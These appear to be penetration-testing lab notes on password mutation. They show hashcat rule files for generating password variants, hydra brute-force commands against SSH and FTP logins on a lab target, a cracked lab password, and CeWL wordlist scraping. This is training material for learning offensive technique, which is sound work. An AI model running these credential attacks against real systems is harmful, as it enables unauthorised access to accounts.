# Password mutation

Objective : find weak passwords which respect password policy

cat password.list

password

cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
$1 $2 $3
c $1 $2 $3
c so0
sa@ $1 $2 $3
c sa@ $1 $2 $3
c sa@ so0 $1 $2 $3
$! $1 $2 $3
$! c $1 $2 $3
$! so0 $1 $2 $3
$! sa@ $1 $2 $3
$! c so0 $1 $2 $3
$! c sa@ $1 $2 $3
$! so0 sa@ $1 $2 $3
$! c so0 sa@ $1 $2 $3

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

cat mut_password.list

hydra -l sam -P mut_password.list ssh://$TARGET

sed -ri '/^.{,9}$/d' mut_password.list
head -17000 mut_password.list > 7000mut_password.list
hydra -l sam -P 7000mut_password.list ftp://$TARGET -t 64

B@tm@n2022!

find / -name flag.txt -ls 2> /dev/null

## Hashcat Existing Rules

ls /usr/share/hashcat/rules/

## CeWL

CeWL scan potential words from the company's website and save them in a separate list.

cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist